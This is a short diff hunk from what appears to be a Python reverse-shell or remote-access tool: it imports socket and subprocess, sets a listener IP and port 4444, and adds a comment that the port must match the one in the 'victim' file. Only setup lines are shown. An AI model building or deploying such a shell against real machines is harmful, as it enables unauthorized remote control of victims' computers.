@@ -3,7 +3,7 @@ import socket
 import subprocess
 
 server_ip = "127.0.0.1"  # << SET YOUR IP (LISTENER)
-server_port = 4444 #SET PORT FOR CONECTION
+server_port = 4444 #SET PORT FOR CONECTION  #(HINT:  MUST THE PORT IT SET SHOULD BE THE SAME PORT IN AONTHER FILE(VICTIM))
 
 while True:
     try:
